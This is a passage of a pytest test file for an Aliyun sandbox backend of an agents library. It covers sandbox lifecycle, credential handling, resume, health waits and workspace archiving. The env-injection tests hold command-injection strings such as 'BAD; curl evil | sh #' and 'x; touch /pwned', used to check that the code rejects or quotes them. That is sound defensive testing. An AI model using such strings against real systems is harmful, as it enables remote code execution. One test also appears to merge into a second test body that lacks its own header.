    sandbox.health = object()  # non-dict, non-None → treated as running
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    assert await session.running() is True


async def test_shutdown_deletes_sandbox(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox(sandbox_id="owned-sandbox")
    client = _FakeSandboxClient(config=_FakeConfig())
    session = _make_session(
        aliyun_sandbox,
        state=_make_state(aliyun_sandbox, sandbox_id="owned-sandbox"),
        sandbox=sandbox,
        client=client,
    )
    await session.shutdown()
    assert "owned-sandbox" in _FakeSandboxClient.delete_calls
    assert session._sandbox is None


async def test_shutdown_without_client_uses_handle_delete(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox(sandbox_id="handle")
    session = _make_session(aliyun_sandbox, sandbox=sandbox, client=None)
    await session.shutdown()
    assert sandbox.delete_async_calls == 1
    assert session._sandbox is None


async def test_shutdown_idempotent(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox(sandbox_id="owned-sandbox")
    client = _FakeSandboxClient(config=_FakeConfig())
    session = _make_session(
        aliyun_sandbox,
        state=_make_state(aliyun_sandbox, sandbox_id="owned-sandbox"),
        sandbox=sandbox,
        client=client,
    )
    await session.shutdown()
    await session.shutdown()  # must not raise
    assert _FakeSandboxClient.delete_calls.count("owned-sandbox") == 1


# --------------------------------------------------------------------------- #
# H. Port exposure                                                            #
# --------------------------------------------------------------------------- #


async def test_exposed_port_always_unavailable(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    session = _make_session(aliyun_sandbox)
    with pytest.raises(ExposedPortUnavailableError):
        await session._resolve_exposed_port(8080)


# --------------------------------------------------------------------------- #
# I. AliyunSandboxClient                                                      #
# --------------------------------------------------------------------------- #


async def test_client_create_threads_options_into_state(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    fake_sandbox = _FakeCodeInterpreterSandbox(sandbox_id="created-sandbox")
    _FakeSandboxClient.next_sandbox = fake_sandbox

    client = aliyun_sandbox.AliyunSandboxClient(access_key_id="root-ak")
    options = aliyun_sandbox.AliyunSandboxClientOptions(
        access_key_id="opt-ak",
        access_key_secret="opt-sk",
        api_key="opt-key",
        region="cn-shanghai",
        template_name="t1",
        sandbox_idle_timeout_seconds=60,
        env={"X": "y"},
    )
    session = await client.create(options=options)
    inner = session._inner
    st = inner.state
    # Credentials are resolved into the agentrun Config held on the session, not state.
    assert inner._config.kwargs["access_key_id"] == "opt-ak"
    assert inner._config.kwargs["access_key_secret"] == "opt-sk"
    assert inner._config.kwargs["headers"] == {"X-API-Key": "opt-key"}
    assert inner._config.kwargs["region_id"] == "cn-shanghai"
    # Non-credential options pass through to the serializable state.
    assert st.template_name == "t1"
    assert st.sandbox_idle_timeout_seconds == 60
    assert st.env == {"X": "y"}
    assert st.region == "cn-shanghai"
    assert st.sandbox_id == "created-sandbox"


async def test_client_create_falls_back_to_client_credentials(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    _FakeSandboxClient.next_sandbox = _FakeCodeInterpreterSandbox()
    client = aliyun_sandbox.AliyunSandboxClient(
        access_key_id="root-ak",
        access_key_secret="root-sk",
    )
    session = await client.create(options=aliyun_sandbox.AliyunSandboxClientOptions())
    inner = session._inner
    assert inner._config.kwargs["access_key_id"] == "root-ak"
    assert inner._config.kwargs["access_key_secret"] == "root-sk"


async def test_client_create_honors_client_region_default(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    _FakeSandboxClient.next_sandbox = _FakeCodeInterpreterSandbox()
    # Client-level region must win when options leaves region unset (default None).
    client = aliyun_sandbox.AliyunSandboxClient(region="cn-shanghai")
    session = await client.create(options=aliyun_sandbox.AliyunSandboxClientOptions())
    inner = session._inner
    assert inner.state.region == "cn-shanghai"
    assert inner._config.kwargs["region_id"] == "cn-shanghai"


async def test_client_create_options_region_overrides_client(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    _FakeSandboxClient.next_sandbox = _FakeCodeInterpreterSandbox()
    client = aliyun_sandbox.AliyunSandboxClient(region="cn-shanghai")
    options = aliyun_sandbox.AliyunSandboxClientOptions(region="cn-beijing")
    session = await client.create(options=options)
    assert session._inner.state.region == "cn-beijing"


def test_session_state_serialization_omits_credentials(monkeypatch: pytest.MonkeyPatch) -> None:
    """Serialized session state must not leak credentials to disk."""
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    state = _make_state(aliyun_sandbox)
    payload = state.model_dump(mode="json")
    for forbidden in ("access_key_id", "access_key_secret", "account_id", "api_key"):
        assert forbidden not in payload, f"{forbidden!r} unexpectedly present in serialized state"


async def test_client_create_raises_on_create_failure(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    _FakeSandboxClient.create_failures = [RuntimeError("boom")]
    client = aliyun_sandbox.AliyunSandboxClient()
    with pytest.raises(WorkspaceStartError):
        await client.create(options=aliyun_sandbox.AliyunSandboxClientOptions())


async def test_client_delete_calls_inner_shutdown(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    fake_sandbox = _FakeCodeInterpreterSandbox(sandbox_id="to-delete")
    _FakeSandboxClient.next_sandbox = fake_sandbox

    client = aliyun_sandbox.AliyunSandboxClient()
    session = await client.create(options=aliyun_sandbox.AliyunSandboxClientOptions())
    await client.delete(session)
    assert "to-delete" in _FakeSandboxClient.delete_calls


async def test_client_delete_rejects_wrong_session_type(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    client = aliyun_sandbox.AliyunSandboxClient()
    bogus_session = MagicMock()
    bogus_session._inner = MagicMock()  # not an AliyunSandboxSession
    with pytest.raises(TypeError):
        await client.delete(bogus_session)


async def test_client_resume_rejects_wrong_state_type(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)

    class _OtherState(SandboxSessionState):
        type: Literal["other"] = "other"

    bad_state = _OtherState(
        manifest=Manifest(),
        snapshot=NoopSnapshot(id="x"),
    )
    client = aliyun_sandbox.AliyunSandboxClient()
    with pytest.raises(TypeError):
        await client.resume(bad_state)


async def test_client_resume_provisions_fresh_when_no_sandbox_id(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    _FakeSandboxClient.next_sandbox = _FakeCodeInterpreterSandbox()
    client = aliyun_sandbox.AliyunSandboxClient(access_key_id="resumed-ak")
    state = _make_state(aliyun_sandbox, sandbox_id="")
    state.workspace_root_ready = True
    session = await client.resume(state)
    inner = session._inner
    assert inner.state.workspace_root_ready is False
    assert inner._start_workspace_state_preserved is False
    # Resume re-injects credentials from the client onto the session Config.
    assert inner._config.kwargs["access_key_id"] == "resumed-ak"


async def test_client_resume_reattaches_existing_sandbox(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    existing = _FakeCodeInterpreterSandbox(sandbox_id="live-sandbox")
    _FakeSandboxClient.get_result = existing
    client = aliyun_sandbox.AliyunSandboxClient(access_key_id="ak", access_key_secret="sk")
    state = _make_state(aliyun_sandbox, sandbox_id="live-sandbox")
    session = await client.resume(state)
    inner = session._inner
    assert inner._sandbox is existing
    assert inner._start_workspace_state_preserved is True
    assert "live-sandbox" in _FakeSandboxClient.get_calls


async def test_client_resume_reattach_unhealthy_falls_back(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    # get_sandbox_async returns a record, but the instance is not healthy (stopped).
    stale = _FakeCodeInterpreterSandbox(sandbox_id="stale")
    stale.health = {"status": "stopped"}
    _FakeSandboxClient.get_result = stale
    _FakeSandboxClient.next_sandbox = _FakeCodeInterpreterSandbox(sandbox_id="fresh")
    client = aliyun_sandbox.AliyunSandboxClient()
    state = _make_state(aliyun_sandbox, sandbox_id="stale")
    session = await client.resume(state)
    inner = session._inner
    # Unhealthy reattach → fresh sandbox provisioned, not preserved.
    assert inner._start_workspace_state_preserved is False
    assert inner.state.sandbox_id == "fresh"


async def test_client_resume_falls_back_when_reattach_not_found(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    _FakeSandboxClient.get_result = _FakeHTTPError(404)
    _FakeSandboxClient.next_sandbox = _FakeCodeInterpreterSandbox(sandbox_id="fresh")
    client = aliyun_sandbox.AliyunSandboxClient()
    state = _make_state(aliyun_sandbox, sandbox_id="gone-sandbox")
    session = await client.resume(state)
    inner = session._inner
    assert inner._start_workspace_state_preserved is False
    assert inner.state.sandbox_id == "fresh"


async def test_create_does_not_mutate_client_credentials(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    _FakeSandboxClient.next_sandbox = _FakeCodeInterpreterSandbox()
    client = aliyun_sandbox.AliyunSandboxClient(access_key_id="client-ak")
    # A per-call option credential must not overwrite the shared client credential,
    # or a later resume() of another session could run under the wrong account.
    await client.create(options=aliyun_sandbox.AliyunSandboxClientOptions(access_key_id="opt-ak"))
    assert client._access_key_id == "client-ak"
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    state = _make_state(aliyun_sandbox, template_name="t", region="cn-shanghai")
    client = aliyun_sandbox.AliyunSandboxClient()
    payload = client.serialize_session_state(state)
    restored = client.deserialize_session_state(payload)
    assert isinstance(restored, aliyun_sandbox.AliyunSandboxSessionState)
    assert restored.template_name == "t"
    assert restored.region == "cn-shanghai"


# --------------------------------------------------------------------------- #
# K. Env injection                                                            #
# --------------------------------------------------------------------------- #


async def test_env_prefix_applied_to_commands(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    session = _make_session(
        aliyun_sandbox, state=_make_state(aliyun_sandbox, env={"FOO": "bar"}), sandbox=sandbox
    )
    await session._exec_internal("echo", "hi")
    assert sandbox.process.calls[-1]["command"] == "FOO=bar echo hi"


async def test_env_prefix_merges_manifest_and_options(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    manifest = Manifest(
        root=aliyun_sandbox.DEFAULT_ALIYUN_WORKSPACE_ROOT,
        environment=Environment(value={"SECRET": "s3cr3t", "SHARED": "from-manifest"}),
    )
    state = _make_state(aliyun_sandbox, manifest=manifest, env={"A": "b", "SHARED": "from-options"})
    session = _make_session(aliyun_sandbox, state=state, sandbox=sandbox)
    await session._exec_internal("echo", "hi")
    prefix = _env_prefix(sandbox.process.calls[-1]["command"])
    assert "A=b" in prefix
    assert "SECRET=s3cr3t" in prefix
    # Manifest wins on key collisions.
    assert "SHARED=from-manifest" in prefix
    assert "from-options" not in prefix


async def test_env_prefix_quotes_values_with_spaces(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    session = _make_session(
        aliyun_sandbox, state=_make_state(aliyun_sandbox, env={"K": "v 1"}), sandbox=sandbox
    )
    await session._exec_internal("echo", "hi")
    assert "K='v 1'" in sandbox.process.calls[-1]["command"]


async def test_env_prefix_skips_unsafe_names(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    state = _make_state(
        aliyun_sandbox, env={"GOOD": "1", "BAD; curl evil | sh #": "x", "also bad": "y"}
    )
    session = _make_session(aliyun_sandbox, state=state, sandbox=sandbox)
    await session._exec_internal("echo", "hi")
    cmd = sandbox.process.calls[-1]["command"]
    assert "GOOD=1" in cmd
    assert "curl evil" not in cmd
    assert "also bad" not in cmd


async def test_env_prefix_value_with_metachars_is_safe(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    state = _make_state(aliyun_sandbox, env={"EVIL": "x; touch /pwned"})
    session = _make_session(aliyun_sandbox, state=state, sandbox=sandbox)
    await session._exec_internal("echo", "hi")
    cmd = sandbox.process.calls[-1]["command"]
    # The metacharacters are shlex-quoted into the value, not executed.
    assert "EVIL='x; touch /pwned'" in cmd
    assert cmd.endswith("echo hi")


async def test_env_value_not_logged(
    monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    session = _make_session(
        aliyun_sandbox,
        state=_make_state(aliyun_sandbox, env={"SECRET": "s3cr3t-value"}),
        sandbox=sandbox,
    )
    with caplog.at_level(logging.INFO, logger="agents.extensions.sandbox.aliyun.sandbox"):
        await session._exec_internal("echo", "hi")
    # The secret reaches the sandbox in the command prefix...
    assert "s3cr3t-value" in sandbox.process.calls[-1]["command"]
    # ...but the log records only the bare command, never the env prefix.
    assert "s3cr3t-value" not in caplog.text


# --------------------------------------------------------------------------- #
# L. _prepare_backend_workspace                                               #
# --------------------------------------------------------------------------- #


async def test_prepare_backend_workspace_mkdir_ok(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    await session._prepare_backend_workspace()
    assert any("mkdir" in c["command"] for c in sandbox.process.calls)


async def test_prepare_backend_workspace_mkdir_nonzero_raises(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    sandbox.process.result = {"stdout": "", "stderr": "denied", "exitCode": 1}
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    with pytest.raises(WorkspaceStartError):
        await session._prepare_backend_workspace()


# --------------------------------------------------------------------------- #
# L2. Health wait after create                                                #
# --------------------------------------------------------------------------- #


async def test_wait_until_healthy_polls_until_ready(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    monkeypatch.setattr(aliyun_sandbox, "ALIYUN_HEALTH_POLL_INTERVAL_S", 0.0)
    sandbox = _FakeCodeInterpreterSandbox()
    sandbox.health = [{"status": "starting"}, {"status": "starting"}, {"status": "ok"}]
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    await session._wait_until_healthy(sandbox)  # returns once status flips to ok
    assert sandbox.health == []  # all three scripted probes consumed


async def test_wait_until_healthy_timeout_raises(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    monkeypatch.setattr(aliyun_sandbox, "ALIYUN_HEALTH_POLL_INTERVAL_S", 0.0)
    monkeypatch.setattr(aliyun_sandbox, "DEFAULT_ALIYUN_WAIT_FOR_RUNNING_TIMEOUT_S", 3.0)
    sandbox = _FakeCodeInterpreterSandbox()
    sandbox.health = {"status": "starting"}  # never becomes ready
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    with pytest.raises(WorkspaceStartError) as excinfo:
        await session._wait_until_healthy(sandbox)
    assert excinfo.value.context["reason"] == "sandbox_not_healthy"


async def test_client_create_waits_for_health_timeout(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    monkeypatch.setattr(aliyun_sandbox, "ALIYUN_HEALTH_POLL_INTERVAL_S", 0.0)
    monkeypatch.setattr(aliyun_sandbox, "DEFAULT_ALIYUN_WAIT_FOR_RUNNING_TIMEOUT_S", 2.0)
    booting = _FakeCodeInterpreterSandbox(sandbox_id="booting")
    booting.health = {"status": "starting"}
    _FakeSandboxClient.next_sandbox = booting
    client = aliyun_sandbox.AliyunSandboxClient()
    with pytest.raises(WorkspaceStartError):
        await client.create(options=aliyun_sandbox.AliyunSandboxClientOptions())
    # The sandbox was created but never became healthy → it must be deleted so it
    # doesn't leak (create raises without returning a session to tear down).
    assert "booting" in _FakeSandboxClient.delete_calls


async def test_run_command_retries_resolve_helper_empty_stdout(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    results = [
        {"stdout": "", "stderr": "", "exitCode": 0},  # empty stdout → retry
        {"stdout": "/home/user/x", "stderr": "", "exitCode": 0},
    ]

    def _side(*, command: str, cwd: str | None = None, timeout: int = 30) -> Any:
        return results.pop(0)

    sandbox.process.side_effect = _side
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    exit_code, stdout, _stderr = await session._run_command(
        sandbox, "resolve-workspace-path", ["--foo"]
    )
    assert stdout == "/home/user/x"
    assert len(sandbox.process.calls) == 2


# --------------------------------------------------------------------------- #
# M. Workspace persistence (persist / hydrate)                                #
# --------------------------------------------------------------------------- #


def _archive_path_for(session: Any) -> str:
    return f"/tmp/openai-agents-aliyun-{session.state.session_id.hex}.tar"


async def test_persist_workspace_happy(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    # `tar cf` succeeds (default exit 0); the archive is present for download.
    tar_bytes = _make_tar({"a.txt": b"data"})
    sandbox.file_system.files[_archive_path_for(session)] = tar_bytes

    buf = await session.persist_workspace()
    assert buf.read() == tar_bytes
    # The temp archive is cleaned up afterward (rm command issued).
    assert any(c["command"].startswith("rm ") for c in sandbox.process.calls)


async def test_persist_workspace_tar_nonzero_raises(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    sandbox.process.result = {"stdout": "", "stderr": "tar failed", "exitCode": 2}
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    with pytest.raises(WorkspaceArchiveReadError):
        await session.persist_workspace()


async def test_persist_workspace_missing_archive_raises_not_found(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    # tar reports success but the archive file is absent → not found.
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    with pytest.raises(WorkspaceReadNotFoundError):
        await session.persist_workspace()


async def test_hydrate_workspace_happy(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    tar_bytes = _make_tar({"a.txt": b"data"})
    await session.hydrate_workspace(io.BytesIO(tar_bytes))
    # The archive was uploaded before extraction.
    assert sandbox.file_system.files[_archive_path_for(session)] == tar_bytes
    cmds = [c["command"] for c in sandbox.process.calls]
    assert any(c.startswith("tar xf") for c in cmds)


async def test_hydrate_workspace_invalid_tar_raises(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    with pytest.raises(WorkspaceArchiveWriteError):
        await session.hydrate_workspace(io.BytesIO(b"not a tar"))


async def test_hydrate_workspace_extract_nonzero_raises(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    sandbox.process.result = {"stdout": "", "stderr": "extract failed", "exitCode": 2}
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    tar_bytes = _make_tar({"a.txt": b"data"})
    with pytest.raises(WorkspaceArchiveWriteError):
        await session.hydrate_workspace(io.BytesIO(tar_bytes))


# --------------------------------------------------------------------------- #
# N. Client error branches                                                    #
# --------------------------------------------------------------------------- #


async def test_client_delete_swallows_shutdown_failure(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    _FakeSandboxClient.next_sandbox = _FakeCodeInterpreterSandbox(sandbox_id="x")
    client = aliyun_sandbox.AliyunSandboxClient()
    session = await client.create(options=aliyun_sandbox.AliyunSandboxClientOptions())

    async def _boom() -> None:
        raise RuntimeError("shutdown failed")

    session._inner.shutdown = _boom
    result = await client.delete(session)  # must not raise
    assert result is session


async def test_client_resume_reattach_error_falls_back_to_fresh(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    # Non-404 error from get_sandbox_async → reattach re-raises → resume falls back.
    _FakeSandboxClient.get_result = RuntimeError("boom")
    _FakeSandboxClient.next_sandbox = _FakeCodeInterpreterSandbox(sandbox_id="fresh")
    client = aliyun_sandbox.AliyunSandboxClient()
    state = _make_state(aliyun_sandbox, sandbox_id="stale-id")
    session = await client.resume(state)
    inner = session._inner
    assert inner.state.sandbox_id == "fresh"
    assert inner._start_workspace_state_preserved is False
